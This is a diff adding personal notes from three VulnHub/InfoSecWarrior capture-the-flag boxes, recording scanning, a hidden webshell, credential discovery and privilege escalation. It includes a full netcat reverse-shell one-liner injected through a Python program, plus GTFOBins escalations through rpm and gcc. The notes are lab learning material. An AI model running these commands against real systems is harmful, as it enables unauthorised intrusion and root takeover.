@@ -1,0 +1,228 @@
+PART 1 - INITIAL STUFF
+nmap -sn 192.168.149.0/24
+Discovered 192.168.149.133
+nmap 192.168.149.133
+80 and 22 are open
+
+EXPLOITATION - APACHE SERVER
+Used web browser, navigated to 192.168.149.133
+Apache default webpage
+Used ZAP to crawl page
+found sitemap.xml
+What is this? Typo?
+http://infosecwarrior.com/index.htnl
+Went to 192.168.149.133/index.htnl
+Found funny gif?
+Also another hidden gif
+FROM 192.168.149.133/index.htnl
+In html I found a reference to /cmd.php
+It was “hidden” so I just removed that part of the html
+Was given what appears to be a webshell, entered “whoami”
+Returned a taunting “try the other option”
+Only other relevant option is changing from get to post
+Changed GET to POST
+Works now, “you found me :(“
+I have a working webshell with the user apache
+Tried to set up reverse shells, nothing worked
+Started looking around files
+Cmd.php has creds in it…
+LPE - OVERPRIVILEGED PROGRAM (RPM)
+Used creds form cmd.php to login with ssh
+Now I have a shell as user isw0
+The kernel is vulnerable (2.6.3), tried to run dirty c0w
+Can’t execute files for some reason? CTFy configs?
+seLinux is installed, locked down shell?
+Shell is very locked down, but I do have python.
+Not useful?
+Lets see what isw0 can run...sudo -l
+Ping, ping6, ls, rpm, and mktemp
+GTFO bins
+Rpm has some options, none of the others do
+Ran the priv esc command from GTFO bins
+sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
+Asked for sudo passwd, gave isw0 password
+Works because isw0 has perms to run sudo on certain commands??
+Got root
+
+PART 2 - INITIAL STUFF
+Nmap -sn 192.168.149.0/24
+Vulnbox is 192.168.149.135
+nmap –A –T4 -vv -A -p1-65535 192.168.149.135
+22 is open
+56563 is open? 
+
+PYTHON PROGRAM EXPLOITATION AND USER SHELL
+Python ping program?!?
+./script.py
+Input is parsed as an integer by python int()
+Woah, hold on maybe there is a way around this
+Input “import” into ping prompt and received this:
+The input string appears to be parsed as a separate file, maybe I could make a python reverse shell and run it?
+This took forever to find
+Passed a python reverse shell to the program, and got a shell :)
+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.149.129 4444>/tmp/f')
+Finally, this took forever too
+I am user bla1
+Spawned interactive shell with python -c  ‘import pty;pty.spawn(“/bin/bash”)’
+Password left in a note in the home directory of bla1
+Encoded group password
+From base64, string is “s3cr3t”
+Sudo -l returns no results, locked down shell :(
+SSH prompts, find hostname and distro codename…
+Ok looked up distro from uname -a, “bionic”
+Hostnames to try: bla, bla1, bla2, ck04
+SSH username = hostname, password is bionic?
+Used ck04 and it worked, got user flag.
+
+
+CK04 →  ROOT
+Used “bash” in shell from ssh connection
+Got some sort of weird semi-interactive shell
+Socat shell : socat stdin exec:/bin/sh
+Within socat shell, python shell: python -c  ‘import pty;pty.spawn(“/bin/bash”)’
+Nice interactive shell again :) 
+Cat /etc/group
+Noticed that bla is the root user
+Ck04 is part of bla group?
+There is a samba share
+Bla has control of cd drive, would be really cool if this were a way to get root
+No i am dumb
+Back to ck04 home directory
+“Shell” is owned by bla, way to get root from this?
+Sudo -l
+(bla) NOPASSWD: ALL
+What does this mean?
+By default, sudo requires that a user authenticate him or herself before running a command. This behavior can be modified via the NOPASSWD tag -sudo man pages
+HINDSIGHT EDIT: you can execute anything as the user bla without entering the password, if I understood the output of sudo -l this would have been super easy
+bla can run sudo without the sudo password? idk 
+The “no command found” in “shell” is a fake
+Cat shell:
+#!/bin/sh
+cat /home/bla/user.txt
+read ip
+echo `$ip` command not found
+Exploit the usage of the $ip as sudo…
+
+Furthermore…
+Stat shell reveals that the suid bit is set for this file (rws), so the program doesn't run with the privilege of user who ran it, instead, with the privilege of file owner
+I am stupid
+This is an easy box, I am overthinking it
+Sudo -u bla /bin/bash
+Duh :(
+
+BLA → ROOT
+https://hack-tips.com/2020/04/13/vulnhub-infosecwarrior-ctf-2020-02walkthrough/
+Got stuck, used walkthrough :
+
+PART 3 - INITIAL STUFF
+Box on 192.168.0.31
+SSH and Web are open
+Apache/2.4.29 (Ubuntu) Server at 192.168.0.31 Port 80
+OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+
+WORDPRESS ON APACHE SERVER
+Tried gobuster
+Found:
+/wp-content (Status: 301)
+/wp-includes (Status: 301)
+/wp-admin (Status: 301)
+/server-status (Status: 403)
+/phpMyAdmin (Status: 301)
+Also run gobuster on /index.php with the same wordlist
+Gobuster and just visiting the website shows us that it keeps trying to connect to the loopback address, 127.0.0.1?
+Is there any way to change this to make it 192.68.0.31...burpsuite or ZAP?
+No im just dumb, change link…
+Found something really cool
+Found link “127.0.0.1/index.php/category/uncategorized/” and replaced 127.0.0.1 with 192.168.0.31
+Just send the same request to the vulnerable machine, not loopback address!
+Looks like this is supposed to be an internal server?
+
+DIRECTORY? - 192.168.0.31/index.php/category/uncategorized/
+Woah lots of stuff
+First attempt cant upload or change privileges
+Cant read files in user folders
+Cant modify any .php files :(
+Phpinfo with tons of misc info about system
+192.168.0.31/phpMyAdmin/ - web gui login?
+Find a user/password and login
+Inside php info:
+Virtual directory support is false, but I can still traverse directory?
+Config file: /etc/php/7.2/apache2, take a look?
+Dead end
+Admin is webmaster@localhost?
+This doesnt seem right
+Directory Traversal/Enumeration
+/etc/passwd, saw all the users
+Hostname - ck05
+Version - Ubuntu 18.04
+There are scheduled tasks in crontab
+Code compiler in user “loopspell” home directory
+Backup.c in “loopspell” is also interesting
+In krishna home directory
+ “I configured wordpress for you and make you admin of it. Your login credentials are same as your system login credentials.”
+“krishna” is the username, what is the password…
+Weird file called “.hushlogin” in both users home directories
+Login
+Tried to login as webmaster@localhost
+Didnt work
+“Forgot Password”
+You will receive a link to create a new password via email
+Maybe it sends email to webmaster@localhost, and I can create an email on my kali called webmaster@localhost and direct it somehow?
+Looked in HTML, found a hidden section
+“Redirect to ___”
+In login form there is a hiddencookie html section?
+No idea what to do here
+Exploring the server config files
+Found user root:root in wp-users files 
+Logged in to phpMyAdmin with root:root
+
+PHPMYADMIN WEB GUI
+Found password hash for user “krishna” in “user” table of “mysql”
+Eventually broke the hash
+
+Not the smoothest, but it got the job done
+Krishna password hash = infosec
+Root’s hash is root, duh
+
+SSH AS KRISHNA - USER SHELL/LPE
+shhed in: krishna@[ip] infosec
+Sudo -l
+
+Krishna can compile c programs as the user loopspell
+Seen earlier in enumeration
+Msg.txt tells us wordpress admin is krishna:infosec
+The code compiler in loopspell could be used to compile a c program that does whatever I want it to
+Made a c program that chmod 777 a file of my choice
+Didnt change file ownership, code_compiler does not have the set_uid bit set
+Made that program spawn a reverse shell
+Didnt work for some reason
+Maybe I can make a file called “/etc/password/ -E” and read the contents
+Cant have “/” character in file name
+GTFO Bins has shell spawner with gcc
+“-wrapper /bin/sh,-s .”
+Ran as user loopspell, spawned a shell as user loopspell
+Sudo -u loopspell /home/loopspell/code_compiler.sh “-wrapper /bin/sh,-s .”
+
+LOOPSPELL SHELL
+Make interactive with python pty
+Sudo -l
+Can use gcc
+Can use code_compiler without password
+Literally do the exact same thing...very cool
+Whoami = root
+
+
+
+
+#1:
+Pretty easy compared to the rest
+Web stuff was simplest of the three, just a matter of noticing “htnl”
+LPE was super easy, straight from gtfo bins
+#2:
+I enjoyed analyzing the python program, it felt awesome to notice that the input was being run as its own file and exploiting that
+Port was originally annoying to find, not within normal nmap port scope
+Taught me to ping scan all ports
+Edit: About year later and I still scan all ports using nmap -p 1-65335 :D
+This has come in handy many times in these vuln box challenges
+#3
+The best by far
